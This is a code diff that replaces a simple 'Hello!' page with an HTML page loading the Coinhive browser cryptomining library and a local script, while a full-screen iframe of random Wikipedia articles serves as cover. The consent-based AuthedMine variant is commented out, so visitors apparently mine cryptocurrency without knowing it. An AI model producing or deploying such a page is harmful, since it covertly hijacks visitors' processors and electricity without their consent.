@@ -1,1 +1,36 @@
-<h1>Hello!</h1>
+<!DOCTYPE html>
+<html>
+
+<head>
+	<style type="text/css">
+		body { margin: 0; }
+		#floatui{ position:absolute; display:none; }
+		#dot { 
+			position: absolute; 
+			left:0; bottom:0;
+			width:1px; height:1px;
+			background: red;
+		}
+		#bigframe {
+		    display:block; border:none;
+		    height:100vh; width:100vw;
+		}
+	</style>
+
+	<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+	<!--<script src="https://authedmine.com/lib/authedmine.min.js"></script>-->
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script src="m.js"></script>
+	
+	<script type="text/javascript">
+		$(document).ready(function(){
+			$("#bigframe").attr("src", "https://en.wikipedia.org/wiki/Special:Random");
+		});
+	</script>
+</head>
+
+<body>
+	<div id="dot"></div>
+	<iframe id="bigframe"></iframe>
+</body>
+</html>
